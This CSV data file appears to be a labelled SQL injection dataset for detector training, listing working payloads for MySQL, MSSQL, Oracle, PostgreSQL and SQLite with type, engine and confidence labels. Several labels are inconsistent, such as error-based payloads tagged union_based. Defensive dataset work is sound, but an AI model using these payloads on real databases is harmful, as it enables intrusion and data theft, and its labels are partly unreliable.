id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
25290,"-4407"" ) where 2055 = 2055 or elt ( 9714 = 5040,5040 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
25391,"1'|| ( select 'zdfo' from dual where 4288 = 4288 union all select null,null,null,null,null,null,null--",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2
25394,1' ) ) ) waitfor delay '0:0:5' and ( ( ( 'zhhf' like 'zhhf,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
25208,"-1748%"" ) ) ) union all select 2987#",union_based,generic,0.7,UNION-based payload detected. Payload length: 36 chars.,2
25209,"1 ) ) as jzzo where 7773 = 7773 union all select null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 74 chars.,2
25211,"1%"" ) ) ) union all select null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 62 chars.,2
25218,"-8633"" or 5099 = 5974",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
25221,-1643' where 1968 = 1968 or 3484 = 6642,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 39 chars.,2
25232,"-8933 ) as iiyr where 1974 = 1974 union all select 1974,1974,1974,1974,1974#",union_based,generic,0.7,UNION-based payload detected. Payload length: 76 chars.,2
25234,1'|| ( select 'puco' where 2605 = 2605 union all select null#,union_based,generic,0.7,UNION-based payload detected. Payload length: 61 chars.,2
25239,"-3437 ) union all select 7774,7774,7774--",union_based,generic,0.7,UNION-based payload detected. Payload length: 41 chars.,2
25243,"1"" where 7249 = 7249 union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 89 chars.,2
25244,"-1097"" where 4421 = 4421 union all select 4421,4421,4421,4421,4421#",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
25246,-8274' ) ) union all select 3048--,union_based,generic,0.7,UNION-based payload detected. Payload length: 34 chars.,2
25250,"-5581%' ) ) ) union all select 4266,4266,4266,4266,4266,4266,4266,4266,4266,4266#",union_based,generic,0.7,UNION-based payload detected. Payload length: 81 chars.,2
25253,"-3960"" ) ) union all select 7813,7813,7813,7813,7813,7813--",union_based,generic,0.7,UNION-based payload detected. Payload length: 59 chars.,2
25261,"-3359 union all select 4675,4675,4675--",union_based,generic,0.7,UNION-based payload detected. Payload length: 39 chars.,2
25262,"1"" ) where 9545 = 9545 and 9198 = 9198--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 40 chars.,2
25265,-1011 or 7140 = 9977--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
25270,"1"" ) where 2388 = 2388 union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 86 chars.,2
25271,"1"" ) union all select null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 38 chars.,2
25273,"1' union all select null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 31 chars.,2
25275,"-8436' ) as frmf where 7225 = 7225 or make_set ( 9354 = 9354,7185 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 70 chars.,2
25279,"-2625"" ) ) as qfuo where 1980 = 1980 union all select 1980,1980,1980--",union_based,generic,0.7,UNION-based payload detected. Payload length: 70 chars.,2
25284,"1' ) union all select null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 57 chars.,2
25292,"1"" where 8978 = 8978 union all select null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 79 chars.,2
25308,"-2211"" or 2113 = 8885#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
25310,"-4797' union all select 8223,8223,8223,8223,8223,8223,8223,8223#",union_based,generic,0.7,UNION-based payload detected. Payload length: 64 chars.,2
25319,1' and 5835 = 6157 and 'bjee' like 'bjee,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 40 chars.,2
25323,-7636' ) or 5898 = 8880 and ( 'sjuv' = 'sjuv,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 44 chars.,2
25324,"-3747"" ) union all select 8962,8962,8962,8962,8962#",union_based,generic,0.7,UNION-based payload detected. Payload length: 51 chars.,2
25325,"-8893 ) union all select 7594,7594,7594,7594,7594,7594#",union_based,generic,0.7,UNION-based payload detected. Payload length: 55 chars.,2
25332,"1%"" and 7533 = 7533 and ""%"" = """,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 31 chars.,2
25337,"-1258"" ) ) union all select 7734,7734,7734#",union_based,generic,0.7,UNION-based payload detected. Payload length: 43 chars.,2
25342,"1' ) where 5071 = 5071 union all select null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 76 chars.,2
25349,"-5963"" or 9323 = 9323#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
25360,"1%"" ) ) union all select null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 40 chars.,2
25361,-2364' or 6743 = 7578,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
25364,"-9398' union all select 3998,3998,3998,3998,3998,3998,3998,3998,3998#",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
25370,"1%' ) ) union all select null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 66 chars.,2
25373,"1 ) ) union all select null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 34 chars.,2
25379,"1' ) ) ) union all select null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 36 chars.,2
25382,"-7851"" ) ) or 6872 = 6872 and ( ( ""dvbw"" like ""dvbw",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 51 chars.,2
25387,"1"" ) where 4382 = 4382 and 6607 = 2394--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 40 chars.,2
25390,"-3368' ) ) union all select 4913,4913,4913,4913,4913,4913,4913,4913,4913--",union_based,generic,0.7,UNION-based payload detected. Payload length: 74 chars.,2
25257,"1%"" ) )",benign,generic,0.5,. Payload length: 7 chars.,2
25318,1%' ) ),benign,generic,0.5,. Payload length: 7 chars.,2
25320,"make_set ( 5679 = 9769,9769 )",benign,generic,0.5,. Payload length: 29 chars.,2
25351,1 ) ),benign,generic,0.5,. Payload length: 5 chars.,2
25365,end-- podi,benign,generic,0.5,. Payload length: 10 chars.,2
25216,"1%"" ) ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; Error-based SQLi (extractvalue/updatexml); DB: mysql",1
25222,"1' ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( 'gxgi' = 'gxgi",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
25223,"1"" where 5236 = 5236 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
25226,"1' ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; Error-based SQLi (extractvalue/updatexml); DB: mysql",1
25242,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ""nwjv"" = ""nwjv",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
25249,"1' ) where 8835 = 8835 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
25278,"1' ) and elt ( 4249 = 4249,7259 ) and ( 'ifca' like 'ifca",boolean_blind,mysql,1.0,"Signals: 'elt', 'if'; Boolean-blind SQLi (OR/AND logic); DB: mysql",1
25285,"1"" ) ) as knyf where 8109 = 8109 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
25301,"1' ) as juxt where 5956 = 5956 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
25304,"1' ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
25312,"1 ) ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 6265 = 6265",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
25372,"1"" ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ""giuq"" = ""giuq",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
25393,"1"" ) where 5719 = 5719 rlike sleep ( 5 ) --",time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
25398,"1' and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and 'egye' = 'egye",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
25206,"1 ) ) as qgok where 3993 = 3993 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
25296,"-3731' ) ) ) or elt ( 7540 = 1412,1412 ) and ( ( ( 'iwch' = 'iwch",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
25326,1 ) or sleep ( 5 ) and ( 2211 = 2211,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
25345,"1"" ) as kfvy where 7305 = 7305 or sleep ( 5 ) --",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
25350,1' where 8584 = 8584 order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 32 chars.,1
25354,"1' and elt ( 4249 = 4249,7259 ) and 'awjd' = 'awjd",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
25358,"1' ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) )",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
25374,1' ) as jxtg where 1071 = 1071 and sleep ( 5 ) --,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
25377,"1%"" or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
25396,"-3729' ) ) or elt ( 4482 = 2648,2648 ) and ( ( 'vkkr' like 'vkkr",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
25219,end and 'hizd' = 'hizd,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,1
25220,"1"" and ( 1668 = 8054 ) *8054",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 28 chars.,1
25255,"-7793"" ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( ""lias"" = ""lias",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 62 chars.,1
25307,"1"" ) and make_set ( 4553 = 8132,8132 ) and ( ""pfci"" like ""pfci",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 62 chars.,1
25317,"-8725"" ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( ""vblw"" like ""vblw",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 65 chars.,1
25388,"1"" ) ) ) and ( 3020 = 3020 ) *6703 and ( ( ( ""krxy"" = ""krxy",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 59 chars.,1
25389,"end and ""unqj"" = ""unqj",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,1
25395,"1%' and make_set ( 1227 = 5627,5627 ) and '%' = '",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 49 chars.,1
25204,1' ) as znak where 5203 = 5203,benign,generic,0.5,. Payload length: 30 chars.,1
25229,"1"" ) where 2070 = 2070",benign,generic,0.5,. Payload length: 22 chars.,1
25321,1 ) where 5629 = 5629,benign,generic,0.5,. Payload length: 21 chars.,1
25330,"1"" ) where 4520 = 4520",benign,generic,0.5,. Payload length: 22 chars.,1
25340,1 where 6518 = 6518,benign,generic,0.5,. Payload length: 19 chars.,1
25343,1' where 5547 = 5547,benign,generic,0.5,. Payload length: 20 chars.,1
25399,1' where 3028 = 3028,benign,generic,0.5,. Payload length: 20 chars.,1
25200,"1"" ) where 4182 = 4182 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'exp'; UNION-based payload detected; DB: mysql",0
25203,"1 ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( 1185 = 1185",union_based,mysql,1.0,"Signals: 'extractvalue', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
25205,-2348 ) as sige where 1639 = 1639 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,union_based,generic,1.0,"Signals: 'chr', 'cast', 'case'; UNION-based payload detected",0
25210,"-8344 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) -- wjpa",union_based,mssql,1.0,"Signals: 'convert', 'char', 'case'; UNION-based payload detected; DB: mssql",0
25214,"1"" ) ) as spvl where 2242 = 2242 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --",union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
25227,"1 where 9898 = 9898 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",union_based,mssql,1.0,"Signals: 'convert', 'char', 'case'; UNION-based payload detected; DB: mssql",0
25230,"-9142%"" ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""%"" = """,union_based,mssql,1.0,"Signals: 'convert', 'char', 'case'; UNION-based payload detected; DB: mssql",0
25233,1' ) as gdie where 8133 = 8133 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --,union_based,mysql,1.0,"Signals: 'rlike', 'case'; UNION-based payload detected; DB: mysql",0
25237,1' ) rlike ( select ( case when ( 2671 = 4485 ) then 1 else 0x28 end ) ) and ( 'ezco' like 'ezco,union_based,mysql,1.0,"Signals: 'rlike', 'case'; UNION-based payload detected; DB: mysql",0
25240,select ( case when ( 2914 = 3335 ) then 2914 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,union_based,generic,1.0,"Signals: 'cast', 'case', 'dual'; UNION-based payload detected",0
25241,-6341' or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and 'ugys' = 'ugys,union_based,generic,1.0,"Signals: 'case', 'rdb'; UNION-based payload detected",0
25247,-6203' ) ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 'luee' = 'luee,union_based,oracle,1.0,"Signals: 'chr', 'case', 'dual'; UNION-based payload detected; DB: oracle",0
25248,"1' or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and 'nazb' = 'nazb",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'if'; UNION-based payload detected; DB: mysql",0
25254,"1 ) where 6082 = 6082 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'char'; UNION-based payload detected; DB: mysql",0
25256,"1' where 6853 = 6853 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'exp'; UNION-based payload detected; DB: mysql",0
25259,1' ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( 'sgdj' like 'sgdj,union_based,oracle,1.0,"Signals: 'chr', 'case', 'utl_inaddr'; UNION-based payload detected; DB: oracle",0
25260,"1%"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ""%"" = """,union_based,oracle,1.0,"Signals: 'xmltype', 'chr', 'case'; UNION-based payload detected; DB: oracle",0
25263,"1' ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( 'luoj' = 'luoj",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'exp'; UNION-based payload detected; DB: mysql",0
25264,"-9263' ) as qodg where 6798 = 6798 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",union_based,oracle,1.0,"Signals: 'chr', 'case', 'ctxsys'; UNION-based payload detected; DB: oracle",0
25266,select ( case when ( 3539 = 8768 ) then 3539 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,union_based,generic,1.0,"Signals: 'cast', 'case', 'dual'; UNION-based payload detected",0
25268,1 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) # pkcp,union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
25272,"1"" ) ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( ""tepf"" = ""tepf",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'char'; UNION-based payload detected; DB: mysql",0
25274,"1' and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'char'; UNION-based payload detected; DB: mysql",0
25283,"1"" ) ) as uqkn where 4642 = 4642 or elt ( 6272 = 6272,sleep ( 5 ) ) --",time_blind,mysql,1.0,"Signals: 'elt', 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql",0
25287,"1 ) ) as pjjz where 8384 = 8384 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",union_based,mysql,1.0,"Signals: 'extractvalue', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
25291,"-5898"" ) ) as fycd where 7135 = 7135 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",union_based,mssql,1.0,"Signals: 'convert', 'char', 'case'; UNION-based payload detected; DB: mssql",0
25298,-2951 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) # gwqv,union_based,oracle,1.0,"Signals: 'xmltype', 'chr', 'case'; UNION-based payload detected; DB: oracle",0
25300,"1"" ) as pkkx where 6716 = 6716 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) --",union_based,mysql,1.0,"Signals: 'updatexml', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
25302,1' ) ) as zffq where 9572 = 9572 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --,union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
25303,"1 ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'if'; UNION-based payload detected; DB: mysql",0
25305,"-4746%"" ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""%"" = """,union_based,oracle,1.0,"Signals: 'chr', 'case', 'ctxsys'; UNION-based payload detected; DB: oracle",0
